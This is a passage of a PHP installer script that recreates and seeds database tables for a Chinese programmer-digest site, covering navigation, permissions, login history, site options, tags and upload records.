 (new Query('INSERT INTO  `#{nav}` VALUES (\'1\',\'首页\',\'/\',\'index\',\'1\',\'1\',\'0\'),(\'3\',\'文章\',\'/article\',\'article\',\'1\',\'2\',\'0\'),(\'4\',\'books\',\'/books\',\'\',\'0\',\'3\',\'0\'),(\'5\',\'问题\',\'/question\',\'\',\'0\',\'6\',\'0\'),(\'7\',\'在线测试\',\'/test\',\'OnlineJudge\',\'0\',\'5\',\'0\'),(\'9\',\'关于\',\'/about\',\'\',\'1\',\'7\',\'0\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{permission}'))->exec();

 (new Query('CREATE TABLE `#{permission}` (
  `gid` int(11) NOT NULL AUTO_INCREMENT,
  `uid` bigint(20) NOT NULL DEFAULT \'0\',
  `sort` int(11) NOT NULL COMMENT \'分组排序\',
  `gname` varchar(80) NOT NULL,
  `editSite` enum(\'Y\',\'N\') NOT NULL DEFAULT \'N\' COMMENT \'编辑站点\',
  `editGroup` enum(\'Y\',\'N\') NOT NULL DEFAULT \'N\' COMMENT \'编辑分组\',
  `editUser` enum(\'Y\',\'N\') NOT NULL DEFAULT \'N\' COMMENT \'编辑用户\',
  `useSu` enum(\'Y\',\'N\') NOT NULL DEFAULT \'N\' COMMENT \'可以使用别人的名义\',
  `editCategory` enum(\'Y\',\'N\') NOT NULL DEFAULT \'N\' COMMENT \'编辑分类\',
  PRIMARY KEY (`gid`),
  UNIQUE KEY `uid` (`uid`),
  KEY `gname` (`gname`),
  KEY `priority` (`sort`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT=\'权限表\''))->exec();

 (new Query('INSERT INTO  `#{permission}` VALUES (\'1\',\'0\',\'0\',\'网站所有者\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{signin_historys}'))->exec();

 (new Query('CREATE TABLE `#{signin_historys}` (
  `hid` bigint(20) NOT NULL AUTO_INCREMENT,
  `uid` bigint(20) NOT NULL,
  `ip` varchar(64) NOT NULL,
  `time` int(11) NOT NULL,
  PRIMARY KEY (`hid`),
  KEY `uid` (`uid`)
) ENGINE=InnoDB AUTO_INCREMENT=91 DEFAULT CHARSET=utf8'))->exec();

 (new Query('INSERT INTO  `#{signin_historys}` VALUES (\'68\',\'53\',\'127.0.0.1\',\'1477102805\'),(\'69\',\'53\',\'127.0.0.1\',\'1477102829\'),(\'70\',\'54\',\'127.0.0.1\',\'1477123665\'),(\'71\',\'54\',\'127.0.0.1\',\'1477123753\'),(\'72\',\'55\',\'127.0.0.1\',\'1477124191\'),(\'73\',\'53\',\'127.0.0.1\',\'1477126270\'),(\'74\',\'56\',\'127.0.0.1\',\'1477145590\'),(\'75\',\'58\',\'127.0.0.1\',\'1477145654\'),(\'76\',\'59\',\'127.0.0.1\',\'1477145658\'),(\'77\',\'60\',\'127.0.0.1\',\'1477145794\'),(\'78\',\'64\',\'127.0.0.1\',\'1477145828\'),(\'79\',\'56\',\'127.0.0.1\',\'1477208501\'),(\'80\',\'53\',\'127.0.0.1\',\'1477278686\'),(\'81\',\'65\',\'127.0.0.1\',\'1477728798\'),(\'82\',\'65\',\'127.0.0.1\',\'1477729377\'),(\'83\',\'65\',\'127.0.0.1\',\'1477729440\'),(\'84\',\'65\',\'127.0.0.1\',\'1477730243\'),(\'85\',\'65\',\'127.0.0.1\',\'1477819694\'),(\'86\',\'53\',\'127.0.0.1\',\'1478156553\'),(\'87\',\'53\',\'127.0.0.1\',\'1478604818\'),(\'88\',\'53\',\'127.0.0.1\',\'1478606107\'),(\'89\',\'54\',\'127.0.0.1\',\'1478678631\'),(\'90\',\'61\',\'127.0.0.1\',\'1478753649\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{site_options}'))->exec();

 (new Query('CREATE TABLE `#{site_options}` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(64) NOT NULL,
  `value` text NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name_2` (`name`),
  KEY `name` (`name`)
) ENGINE=InnoDB AUTO_INCREMENT=32 DEFAULT CHARSET=utf8 COMMENT=\'网站设置表\''))->exec();

 (new Query('INSERT INTO  `#{site_options}` VALUES (\'1\',\'site_name\',\'芒刺中国\'),(\'2\',\'theme\',\'default\'),(\'19\',\'site_logo\',\'/static/img/mccn.svg\'),(\'20\',\'keywords\',\'芒刺,程序员,文摘\'),(\'21\',\'lang\',\'zh_cn\'),(\'22\',\'HV_SignUp\',\'0\'),(\'23\',\'HV_SignIn\',\'0\'),(\'24\',\'HV_Post\',\'0\'),(\'25\',\'HV_Comment\',\'0\'),(\'26\',\'allowSignUp\',\'1\'),(\'27\',\'copyright\',\'芒刺中国\'),(\'28\',\'site_close\',\'0\'),(\'29\',\'close_info\',\'芒刺中国系统开发中\'),(\'31\',\'beian\',\'湘ICP备16001199号-1\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{tags}'))->exec();

 (new Query('CREATE TABLE `#{tags}` (
  `tid` int(11) NOT NULL AUTO_INCREMENT,
  `topic` int(11) NOT NULL,
  `name` varchar(80) NOT NULL,
  `count` int(11) NOT NULL,
  PRIMARY KEY (`tid`),
  UNIQUE KEY `name` (`name`),
  KEY `topic` (`topic`)
) ENGINE=InnoDB AUTO_INCREMENT=53 DEFAULT CHARSET=utf8'))->exec();

 (new Query('INSERT INTO  `#{tags}` VALUES (\'17\',\'0\',\'作者通知\',\'2\'),(\'18\',\'0\',\'网站日志\',\'6\'),(\'19\',\'0\',\'C语言\',\'1\'),(\'20\',\'0\',\'网站通知\',\'1\'),(\'21\',\'0\',\'hello-world\',\'1\'),(\'22\',\'0\',\'hello\',\'1\'),(\'23\',\'0\',\'world\',\'1\'),(\'24\',\'0\',\'what_fuck\',\'1\'),(\'25\',\'0\',\'wahhhhaha\',\'1\'),(\'26\',\'0\',\'fuck\',\'1\'),(\'39\',\'0\',\'Google-Prettify\',\'1\'),(\'42\',\'0\',\'安全\',\'3\'),(\'43\',\'0\',\'XSS\',\'3\'),(\'44\',\'0\',\'session_fixation\',\'3\'),(\'45\',\'0\',\'\',\'1\'),(\'46\',\'0\',\'测试标签\',\'4\'),(\'49\',\'0\',\'测试\',\'9\'),(\'50\',\'0\',\'文章集目录\',\'4\'),(\'51\',\'0\',\'Code::Blocks\',\'1\'),(\'52\',\'0\',\'Code::Blocks使用\',\'2\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{upload_resource}'))->exec();

 (new Query('CREATE TABLE `#{upload_resource}` (
  `rid` bigint(20) NOT NULL AUTO_INCREMENT,
  `type` varchar(12) NOT NULL,
  `hash` varchar(32) NOT NULL,
  `reference` int(11) NOT NULL,
  PRIMARY KEY (`rid`),
  UNIQUE KEY `hash` (`hash`),
  KEY `type` (`type`)
) ENGINE=InnoDB AUTO_INCREMENT=2059 DEFAULT CHARSET=utf8'))->exec();

 (new Query('INSERT INTO  `#{upload_resource}` VALUES (\'1676\',\'zip\',\'38a4f4c7eaccb9c5af9d3fe38c7d3b23\',\'2\'),(\'1677\',\'png\',\'ff761cbfc7a765f282d245c4208922a8\',\'3\'),(\'1678\',\'jpg\',\'8291c2a23be7df8509b078ef5198a27e\',\'1\'),(\'1679\',\'zip\',\'c1b783d94563c591ce7728d36a7812d6\',\'2\'),(\'1681\',\'zip\',\'c9d1e718022e73436b73b9ee4a425c66\',\'1\'),(\'1682\',\'zip\',\'6b76b40e17c9e90900bb31e60f85e7fd\',\'2\'),(\'1683\',\'zip\',\'45bcda9c247abe7e099996ce5841ec21\',\'2\'),(\'1686\',\'zip\',\'e8df091e732f77ec4177d192cf176dcf\',\'1\'),(\'1687\',\'zip\',\'5c08dbf72047e3cb52a30df66d84e6e9\',\'1\'),(\'1688\',\'zip\',\'6381ad09fd8836c71245658c50b2afd9\',\'1\'),(\'1690\',\'zip\',\'57e43822dbd2e019b18eb79328c39d14\',\'2\'),(\'1691\',\'zip\',\'e27817e9d51bcac9f826e0e15da29c51\',\'7\'),(\'1694\',\'zip\',\'898cdf55e5693c9818f0de45a213461b\',\'2\'),(\'1698\',\'zip\',\'98d855e3dd0e2e56741a986bd0c06e39\',\'2\'),(\'1702\',\'zip\',\'7f142b3334f0d64010ec6b0f37126409\',\'1\'),(\'1704\',\'zip\',\'98ec2641f31837c8d8d871ec04521d79\',\'2\'),(\'1706\',\'zip\',\'e04cc1b7e907835511547c62b72871fb\',\'2\'),(\'1708\',\'zip\',\'ca6f73413abd0f866e80662a3fe91d4e\',\'1\'),(\'1711\',\'zip\',\'5f2408ceec63f98fc410acc2db4c843b\',\'2\'),(\'1712\',\'png\',\'3a757192a5b09b29329bafb5f951fd9b\',\'20\'),(\'1713\',\'png\',\'d6aed4f09440caa77fa042be65fcefaa\',\'20\'),(\'1714\',\'png\',\'91b52e3f0ba22ae45efc1fb211651fe9\',\'20\'),(\'1715\',\'png\',\'64dbb9dff94f30f69f661f6d0d29f4ac\',\'20\'),(\'1716\',\'png\',\'cc1d137578dbf1634450cef7f071b599\',\'20\'),(\'1717\',\'png\',\'d181ff5e0e6ff39884c921e985a86ba2\',\'20\'),(\'1718\',\'png\',\'33c03df2857a78ca3678a3fa76136da3\',\'20\'),(\'1719\',\'png\',\'15db4a6aa7515b6744adc99dad80ac4b\',\'20\'),(\'1720\',\'png\',\'15a4d0b3d96031cc6dd027d5f9ba2640\',\'20\'),(\'1721\',\'png\',\'dfc53b916f5e8bc52170631bb6d6cebf\',\'20\'),(\'1722\',\'png\',\'c2e4e14f6b34b26fe155b1248b5a6b22\',\'20\'),(\'1723\',\'png\',\'177ece4458907cdbd82e61f613c14e0a\',\'20\'),(\'1737\',\'zip\',\'dc58827a81fd2becfedcfcaf4fc50f03\',\'1\'),(\'1750\',\'zip\',\'1feab744ca5962b70dcefd87181c2b67\',\'5\'),(\'1815\',\'zip\',\'0999d7de57b8fc9e79e710f3bc851086\',\'4\'),(\'1819\',\'zip\',\'e4abb9792996e5badd06a98b72d8c3d9\',\'1\'),(\'1832\',\'zip\',\'1739fba963b40d7fda8ff3a906c20c03\',\'12\'),(\'1833\',\'zip\',\'abb9591cdf9dbd6463a4d387f814a654\',\'1\'),(\'1834\',\'zip\',\'808d0fdd6ef1ea101d1fbee81daa8ee5\',\'1\'),(\'1835\',\'zip\',\'de5c0be050b27598ce7cf81e03272607\',\'18\'),(\'1853\',\'zip\',\'b7dba917e42b394aa8187f1d578b6c6d\',\'12\'),(\'1865\',\'zip\',\'faf94bbe5e1954c7a39235a480fdf21d\',\'6\'),(\'1871\',\'zip\',\'706d1703496a963d71cb91aa595803a3\',\'2\'),(\'1899\',\'zip\',\'06265051667c5e59873ad6e1005aae44\',\'9\'),(\'2025\',\'zip\',\'7f5b6eac3a9bf1e3d7967d1cbb2529cd\',\'3\'),(\'2028\',\'zip\',\'7807ddb129a23c92698672a4284d6434\',\'1\'),(\'2029\',\'zip\',\'f51d656e1a75d3474e5a38b7d172f25f\',\'1\'),(\'2030\',\'zip\',\'f96a77a1f430139edb6909d5df23af2b\',\'2\'),(\'2032\',\'zip\',\'1e6b85ae2ea0ba3f02b317c1375e3187\',\'6\'),(\'2036\',\'md\',\'e3c8bfb9f0465a78229aba56e8e4b537\',\'3\'),(\'2041\',\'zip\',\'63a10a019d90187aa9b89a046cee8fff\',\'1\'),(\'2042\',\'zip\',\'f9c4c6363d56203ef628e543eb059b3d\',\'1\'),(\'2043\',\'zip\',\'4c7256ba1d5aa2052b1fc8fa3bd6cb48\',\'1\'),(\'2044\',\'zip\',\'a6cc4d5f43101ee86d42f1f12913ae99\',\'7\'),(\'2051\',\'md\',\'287e15a0d195c884e95990e5bcfd71a0\',\'1\'),(\'2052\',\'zip\',\'0e61e8bb24981f75840d328e984123ec\',\'1\'),(\'2053\',\'zip\',\'03511a82fc49ae2d1eafdf9ebedb3e3b\',\'2\'),(\'2054\',\'jpg\',\'6c44f48963639e0862e09a86a96ee609\',\'2\'),(\'2057\',\'zip\',\'2ec22e65ddf78cf25e19b2f71997ac71\',\'1\'),(\'2058\',\'md\',\'65aa333482ad064bb17e06ac5752fcae\',\'1\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{uploads}'))->exec();

 (new Query('CREATE TABLE `#{uploads}` (
  `rid` bigint(20) NOT NULL AUTO_INCREMENT,
  `owner` bigint(20) NOT NULL,
  `for` bigint(20) NOT NULL,
  `what` int(11) NOT NULL COMMENT \'为什么上传的\',
  `name` varchar(80) NOT NULL,
  `extension` varchar(16) NOT NULL,
  `time` int(11) NOT NULL,
  `resource` bigint(20) NOT NULL,
  `public` int(1) NOT NULL COMMENT \'是否公开\',
  PRIMARY KEY (`rid`),
  KEY `owner` (`owner`),
  KEY `public` (`public`),
  KEY `resource` (`resource`),
  KEY `extension` (`extension`),
  KEY `for` (`for`),
  KEY `what` (`what`)
) ENGINE=InnoDB AUTO_INCREMENT=318 DEFAULT CHARSET=utf8 COMMENT=\'上传资源表\''))->exec();

 (new Query('INSERT INTO  `#{uploads}` VALUES (\'112\',\'53\',\'1\',\'0\',\'Infoxx-62\',\'zip\',\'1477102926\',\'1676\',\'0\'),(\'113\',\'53\',\'0\',\'0\',\'100\',\'png\',\'1477102926\',\'1677\',\'1\'),(\'114\',\'53\',\'0\',\'0\',\'c2cec3fdfc03924585e5aeff8794a4c27c1e25e9\',\'jpg\',\'1477105642\',\'1678\',\'1\'),(\'115\',\'53\',\'0\',\'0\',\'UPzipFmt\',\'zip\',\'1477117704\',\'1679\',\'0\'),(\'116\',\'53\',\'0\',\'0\',\'UPzipFmt\',\'zip\',\'1477117877\',\'1681\',\'1\'),(\'117\',\'53\',\'0\',\'0\',\'UPzipFmt\',\'zip\',\'1477126277\',\'1682\',\'0\'),(\'118\',\'53\',\'0\',\'0\',\'UPzipFmt\',\'zip\',\'1477126277\',\'1683\',\'1\'),(\'119\',\'53\',\'0\',\'0\',\'Clanguage\',\'zip\',\'1477126885\',\'1686\',\'0\'),(\'120\',\'53\',\'0\',\'0\',\'Clanguage\',\'zip\',\'1477126947\',\'1687\',\'0\'),(\'121\',\'53\',\'0\',\'0\',\'Infoxx\',\'zip\',\'1477138878\',\'1688\',\'0\'),(\'122\',\'53\',\'0\',\'0\',\'UPzipFmt-\',\'zip\',\'1477195432\',\'1690\',\'0\'),(\'123\',\'53\',\'0\',\'0\',\'UPzipFmt\',\'zip\',\'1477195433\',\'1691\',\'1\'),(\'124\',\'53\',\'0\',\'0\',\'UPzipFmt-\',\'zip\',\'1477196884\',\'1694\',\'0\'),(\'125\',\'53\',\'0\',\'0\',\'UPzipFmt-\',\'zip\',\'1477196985\',\'1698\',\'0\'),(\'126\',\'53\',\'0\',\'0\',\'UPzipFmt-\',\'zip\',\'1477197041\',\'1702\',\'0\'),(\'127\',\'53\',\'0\',\'0\',\'docs\',\'zip\',\'1477202906\',\'1704\',\'0\'),(\'128\',\'53\',\'0\',\'0\',\'docs\',\'zip\',\'1477202982\',\'1706\',\'0\'),(\'129\',\'53\',\'0\',\'0\',\'docs\',\'zip\',\'1477203119\',\'1708\',\'0\'),(\'130\',\'53\',\'0\',\'0\',\'mix-xss-65\',\'zip\',\'1477207147\',\'1711\',\'0\'),(\'131\',\'0\',\'82\',\'0\',\'login_by_cookie\',\'png\',\'1477207147\',\'1712\',\'1\'),(\'132\',\'0\',\'82\',\'0\',\'edit_with_markdown\',\'png\',\'1477207147\',\'1713\',\'1\'),(\'133\',\'0\',\'82\',\'0\',\'nothing\',\'png\',\'1477207147\',\'1714\',\'1\'),(\'134\',\'0\',\'82\',\'0\',\'my_script\',\'png\',\'1477207147\',\'1715\',\'1\'),(\'135\',\'0\',\'82\',\'0\',\'cookies\',\'png\',\'1477207147\',\'1716\',\'1\'),(\'136\',\'0\',\'82\',\'0\',\'xss_def\',\'png\',\'1477207147\',\'1717\',\'1\'),(\'137\',\'0\',\'82\',\'0\',\'cookie_with_js\',\'png\',\'1477207147\',\'1718\',\'1\'),(\'138\',\'0\',\'82\',\'0\',\'one_cookie\',\'png\',\'1477207147\',\'1719\',\'1\'),(\'139\',\'0\',\'82\',\'0\',\'one_cookie_get\',\'png\',\'1477207147\',\'1720\',\'1\'),(\'140\',\'0\',\'82\',\'0\',\'set_cookie\',\'png\',\'1477207147\',\'1721\',\'1\'),(\'141\',\'0\',\'82\',\'0\',\'a_girl\',\'png\',\'1477207148\',\'1722\',\'1\'),(\'142\',\'0\',\'82\',\'0\',\'chance_for_you\',\'png\',\'1477207148\',\'1723\',\'1\'),(\'143\',\'53\',\'0\',\'0\',\'mix-xss-80\',\'zip\',\'1477207391\',\'1737\',\'0\'),(\'144\',\'53\',\'0\',\'0\',\'mix-xss-80\',\'zip\',\'1477208231\',\'1750\',\'0\'),(\'145\',\'56\',\'0\',\'0\',\'mix-xss-80\',\'zip\',\'1477208692\',\'1750\',\'0\'),(\'146\',\'56\',\'86\',\'0\',\'login_by_cookie\',\'png\',\'1477208692\',\'1712\',\'1\'),(\'147\',\'56\',\'86\',\'0\',\'edit_with_markdown\',\'png\',\'1477208692\',\'1713\',\'1\'),(\'148\',\'56\',\'86\',\'0\',\'nothing\',\'png\',\'1477208692\',\'1714\',\'1\'),(\'149\',\'56\',\'86\',\'0\',\'my_script\',\'png\',\'1477208692\',\'1715\',\'1\'),(\'150\',\'56\',\'86\',\'0\',\'cookies\',\'png\',\'1477208692\',\'1716\',\'1\'),(\'151\',\'56\',\'86\',\'0\',\'xss_def\',\'png\',\'1477208692\',\'1717\',\'1\'),(\'152\',\'56\',\'86\',\'0\',\'cookie_with_js\',\'png\',\'1477208692\',\'1718\',\'1\'),(\'153\',\'56\',\'86\',\'0\',\'one_cookie\',\'png\',\'1477208692\',\'1719\',\'1\'),(\'154\',\'56\',\'86\',\'0\',\'one_cookie_get\',\'png\',\'1477208692\',\'1720\',\'1\'),(\'155\',\'56\',\'86\',\'0\',\'set_cookie\',\'png\',\'1477208692\',\'1721\',\'1\'),(\'156\',\'56\',\'86\',\'0\',\'a_girl\',\'png\',\'1477208693\',\'1722\',\'1\'),(\'157\',\'56\',\'86\',\'0\',\'chance_for_you\',\'png\',\'1477208693\',\'1723\',\'1\'),(\'158\',\'56\',\'0\',\'0\',\'mix-xss-80\',\'zip\',\'1477209038\',\'1815\',\'0\'),(\'159\',\'56\',\'0\',\'0\',\'mix-xss-80\',\'zip\',\'1477209206\',\'1819\',\'0\'),(\'160\',\'56\',\'86\',\'0\',\'safe\',\'zip\',\'1477209206\',\'1832\',\'1\'),(\'161\',\'56\',\'0\',\'0\',\'tagtest\',\'zip\',\'1477230682\',\'1833\',\'0\'),(\'162\',\'56\',\'0\',\'0\',\'tagtest\',\'zip\',\'1477230930\',\'1834\',\'0\'),(\'163\',\'56\',\'0\',\'0\',\'mix-xss\',\'zip\',\'1477239109\',\'1835\',\'0\'),(\'164\',\'56\',\'0\',\'0\',\'mix-xss\',\'zip\',\'1477274509\',\'1853\',\'0\'),(\'165\',\'56\',\'0\',\'0\',\'mix-xss\',\'zip\',\'1477276123\',\'1865\',\'0\'),(\'166\',\'56\',\'0\',\'0\',\'mix-xss\',\'zip\',\'1477277319\',\'1871\',\'0\'),(\'167\',\'56\',\'110\',\'0\',\'login_by_cookie\',\'png\',\'1477277319\',\'1712\',\'1\'),(\'168\',\'56\',\'110\',\'0\',\'edit_with_markdown\',\'png\',\'1477277319\',\'1713\',\'1\'),(\'169\',\'56\',\'110\',\'0\',\'nothing\',\'png\',\'1477277320\',\'1714\',\'1\'),(\'170\',\'56\',\'110\',\'0\',\'my_script\',\'png\',\'1477277320\',\'1715\',\'1\'),(\'171\',\'56\',\'110\',\'0\',\'cookies\',\'png\',\'1477277320\',\'1716\',\'1\'),(\'172\',\'56\',\'110\',\'0\',\'xss_def\',\'png\',\'1477277320\',\'1717\',\'1\'),(\'173\',\'56\',\'110\',\'0\',\'cookie_with_js\',\'png\',\'1477277320\',\'1718\',\'1\'),(\'174\',\'56\',\'110\',\'0\',\'one_cookie\',\'png\',\'1477277320\',\'1719\',\'1\'),(\'175\',\'56\',\'110\',\'0\',\'one_cookie_get\',\'png\',\'1477277320\',\'1720\',\'1\'),(\'176\',\'56\',\'110\',\'0\',\'set_cookie\',\'png\',\'1477277320\',\'1721\',\'1\'),(\'177\',\'56\',\'110\',\'0\',\'a_girl\',\'png\',\'1477277320\',\'1722\',\'1\'),(\'178\',\'56\',\'110\',\'0\',\'chance_for_you\',\'png\',\'1477277320\',\'1723\',\'1\'),(\'179\',\'56\',\'110\',\'0\',\'safe\',\'zip\',\'1477277320\',\'1832\',\'1\'),(\'180\',\'56\',\'0\',\'0\',\'mix-xss\',\'zip\',\'1477277825\',\'1899\',\'0\'),(\'181\',\'56\',\'110\',\'0\',\'login_by_cookie\',\'png\',\'1477277825\',\'1712\',\'1\'),(\'182\',\'56\',\'110\',\'0\',\'edit_with_markdown\',\'png\',\'1477277825\',\'1713\',\'1\'),(\'183\',\'56\',\'110\',\'0\',\'nothing\',\'png\',\'1477277825\',\'1714\',\'1\'),(\'184\',\'56\',\'110\',\'0\',\'my_script\',\'png\',\'1477277825\',\'1715\',\'1\'),(\'185\',\'56\',\'110\',\'0\',\'cookies\',\'png\',\'1477277825\',\'1716\',\'1\'),(\'186\',\'56\',\'110\',\'0\',\'xss_def\',\'png\',\'1477277825\',\'1717\',\'1\'),(\'187\',\'56\',\'110\',\'0\',\'cookie_with_js\',\'png\',\'1477277825\',\'1718\',\'1\'),(\'188\',\'56\',\'110\',\'0\',\'one_cookie\',\'png\',\'1477277825\',\'1719\',\'1\'),(\'189\',\'56\',\'110\',\'0\',\'one_cookie_get\',\'png\',\'1477277825\',\'1720\',\'1\'),(\'190\',\'56\',\'110\',\'0\',\'set_cookie\',\'png\',\'1477277825\',\'1721\',\'1\'),(\'191\',\'56\',\'110\',\'0\',\'a_girl\',\'png\',\'1477277825\',\'1722\',\'1\'),(\'192\',\'56\',\'110\',\'0\',\'chance_for_you\',\'png\',\'1477277826\',\'1723\',\'1\'),(\'193\',\'56\',\'110\',\'0\',\'safe\',\'zip\',\'1477277826\',\'1832\',\'1\'),(\'194\',\'56\',\'110\',\'0\',\'login_by_cookie\',\'png\',\'1477277902\',\'1712\',\'1\'),(\'195\',\'56\',\'110\',\'0\',\'edit_with_markdown\',\'png\',\'1477277902\',\'1713\',\'1\'),(\'196\',\'56\',\'110\',\'0\',\'nothing\',\'png\',\'1477277902\',\'1714\',\'1\'),(\'197\',\'56\',\'110\',\'0\',\'my_script\',\'png\',\'1477277902\',\'1715\',\'1\'),(\'198\',\'56\',\'110\',\'0\',\'cookies\',\'png\',\'1477277902\',\'1716\',\'1\'),(\'199\',\'56\',\'110\',\'0\',\'xss_def\',\'png\',\'1477277902\',\'1717\',\'1\'),(\'200\',\'56\',\'110\',\'0\',\'cookie_with_js\',\'png\',\'1477277902\',\'1718\',\'1\'),(\'201\',\'56\',\'110\',\'0\',\'one_cookie\',\'png\',\'1477277902\',\'1719\',\'1\'),(\'202\',\'56\',\'110\',\'0\',\'one_cookie_get\',\'png\',\'1477277902\',\'1720\',\'1\'),(\'203\',\'56\',\'110\',\'0\',\'set_cookie\',\'png\',\'1477277902\',\'1721\',\'1\'),(\'204\',\'56\',\'110\',\'0\',\'a_girl\',\'png\',\'1477277902\',\'1722\',\'1\'),(\'205\',\'56\',\'110\',\'0\',\'chance_for_you\',\'png\',\'1477277903\',\'1723\',\'1\'),(\'206\',\'56\',\'110\',\'0\',\'safe\',\'zip\',\'1477277903\',\'1832\',\'1\'),(\'207\',\'56\',\'110\',\'0\',\'login_by_cookie\',\'png\',\'1477278048\',\'1712\',\'1\'),(\'208\',\'56\',\'110\',\'0\',\'edit_with_markdown\',\'png\',\'1477278048\',\'1713\',\'1\'),(\'209\',\'56\',\'110\',\'0\',\'nothing\',\'png\',\'1477278048\',\'1714\',\'1\'),(\'210\',\'56\',\'110\',\'0\',\'my_script\',\'png\',\'1477278048\',\'1715\',\'1\'),(\'211\',\'56\',\'110\',\'0\',\'cookies\',\'png\',\'1477278048\',\'1716\',\'1\'),(\'212\',\'56\',\'110\',\'0\',\'xss_def\',\'png\',\'1477278048\',\'1717\',\'1\'),(\'213\',\'56\',\'110\',\'0\',\'cookie_with_js\',\'png\',\'1477278049\',\'1718\',\'1\'),(\'214\',\'56\',\'110\',\'0\',\'one_cookie\',\'png\',\'1477278049\',\'1719\',\'1\'),(\'215\',\'56\',\'110\',\'0\',\'one_cookie_get\',\'png\',\'1477278049\',\'1720\',\'1\'),(\'216\',\'56\',\'110\',\'0\',\'set_cookie\',\'png\',\'1477278049\',\'1721\',\'1\'),(\'217\',\'56\',\'110\',\'0\',\'a_girl\',\'png\',\'1477278049\',\'1722\',\'1\'),(\'218\',\'56\',\'110\',\'0\',\'chance_for_you\',\'png\',\'1477278049\',\'1723\',\'1\'),(\'219\',\'56\',\'110\',\'0\',\'safe\',\'zip\',\'1477278049\',\'1832\',\'1\'),(\'220\',\'56\',\'110\',\'0\',\'login_by_cookie\',\'png\',\'1477278094\',\'1712\',\'1\'),(\'221\',\'56\',\'110\',\'0\',\'edit_with_markdown\',\'png\',\'1477278094\',\'1713\',\'1\'),(\'222\',\'56\',\'110\',\'0\',\'nothing\',\'png\',\'1477278094\',\'1714\',\'1\'),(\'223\',\'56\',\'110\',\'0\',\'my_script\',\'png\',\'1477278094\',\'1715\',\'1\'),(\'224\',\'56\',\'110\',\'0\',\'cookies\',\'png\',\'1477278094\',\'1716\',\'1\'),(\'225\',\'56\',\'110\',\'0\',\'xss_def\',\'png\',\'1477278094\',\'1717\',\'1\'),(\'226\',\'56\',\'110\',\'0\',\'cookie_with_js\',\'png\',\'1477278094\',\'1718\',\'1\'),(\'227\',\'56\',\'110\',\'0\',\'one_cookie\',\'png\',\'1477278094\',\'1719\',\'1\'),(\'228\',\'56\',\'110\',\'0\',\'one_cookie_get\',\'png\',\'1477278094\',\'1720\',\'1\'),(\'229\',\'56\',\'110\',\'0\',\'set_cookie\',\'png\',\'1477278095\',\'1721\',\'1\'),(\'230\',\'56\',\'110\',\'0\',\'a_girl\',\'png\',\'1477278095\',\'1722\',\'1\'),(\'231\',\'56\',\'110\',\'0\',\'chance_for_you\',\'png\',\'1477278095\',\'1723\',\'1\'),(\'232\',\'56\',\'110\',\'0\',\'safe\',\'zip\',\'1477278095\',\'1832\',\'1\'),(\'233\',\'56\',\'110\',\'0\',\'login_by_cookie\',\'png\',\'1477278565\',\'1712\',\'1\'),(\'234\',\'56\',\'110\',\'0\',\'edit_with_markdown\',\'png\',\'1477278565\',\'1713\',\'1\'),(\'235\',\'56\',\'110\',\'0\',\'nothing\',\'png\',\'1477278565\',\'1714\',\'1\'),(\'236\',\'56\',\'110\',\'0\',\'my_script\',\'png\',\'1477278565\',\'1715\',\'1\'),(\'237\',\'56\',\'110\',\'0\',\'cookies\',\'png\',\'1477278565\',\'1716\',\'1\'),(\'238\',\'56\',\'110\',\'0\',\'xss_def\',\'png\',\'1477278565\',\'1717\',\'1\'),(\'239\',\'56\',\'110\',\'0\',\'cookie_with_js\',\'png\',\'1477278566\',\'1718\',\'1\'),(\'240\',\'56\',\'110\',\'0\',\'one_cookie\',\'png\',\'1477278566\',\'1719\',\'1\'),(\'241\',\'56\',\'110\',\'0\',\'one_cookie_get\',\'png\',\'1477278566\',\'1720\',\'1\'),(\'242\',\'56\',\'110\',\'0\',\'set_cookie\',\'png\',\'1477278566\',\'1721\',\'1\'),(\'243\',\'56\',\'110\',\'0\',\'a_girl\',\'png\',\'1477278566\',\'1722\',\'1\'),(\'244\',\'56\',\'110\',\'0\',\'chance_for_you\',\'png\',\'1477278566\',\'1723\',\'1\'),(\'245\',\'56\',\'110\',\'0\',\'safe\',\'zip\',\'1477278566\',\'1832\',\'1\'),(\'246\',\'56\',\'110\',\'0\',\'login_by_cookie\',\'png\',\'1477278612\',\'1712\',\'1\'),(\'247\',\'56\',\'110\',\'0\',\'edit_with_markdown\',\'png\',\'1477278612\',\'1713\',\'1\'),(\'248\',\'56\',\'110\',\'0\',\'nothing\',\'png\',\'1477278612\',\'1714\',\'1\'),(\'249\',\'56\',\'110\',\'0\',\'my_script\',\'png\',\'1477278612\',\'1715\',\'1\'),(\'250\',\'56\',\'110\',\'0\',\'cookies\',\'png\',\'1477278613\',\'1716\',\'1\'),(\'251\',\'56\',\'110\',\'0\',\'xss_def\',\'png\',\'1477278613\',\'1717\',\'1\'),(\'252\',\'56\',\'110\',\'0\',\'cookie_with_js\',\'png\',\'1477278613\',\'1718\',\'1\'),(\'253\',\'56\',\'110\',\'0\',\'one_cookie\',\'png\',\'1477278613\',\'1719\',\'1\'),(\'254\',\'56\',\'110\',\'0\',\'one_cookie_get\',\'png\',\'1477278613\',\'1720\',\'1\'),(\'255\',\'56\',\'110\',\'0\',\'set_cookie\',\'png\',\'1477278613\',\'1721\',\'1\'),(\'256\',\'56\',\'110\',\'0\',\'a_girl\',\'png\',\'1477278613\',\'1722\',\'1\'),(\'257\',\'56\',\'110\',\'0\',\'chance_for_you\',\'png\',\'1477278613\',\'1723\',\'1\'),(\'258\',\'56\',\'110\',\'0\',\'safe\',\'zip\',\'1477278613\',\'1832\',\'1\'),(\'259\',\'56\',\'110\',\'0\',\'login_by_cookie\',\'png\',\'1477278639\',\'1712\',\'1\'),(\'260\',\'56\',\'110\',\'0\',\'edit_with_markdown\',\'png\',\'1477278639\',\'1713\',\'1\'),(\'261\',\'56\',\'110\',\'0\',\'nothing\',\'png\',\'1477278640\',\'1714\',\'1\'),(\'262\',\'56\',\'110\',\'0\',\'my_script\',\'png\',\'1477278640\',\'1715\',\'1\'),(\'263\',\'56\',\'110\',\'0\',\'cookies\',\'png\',\'1477278640\',\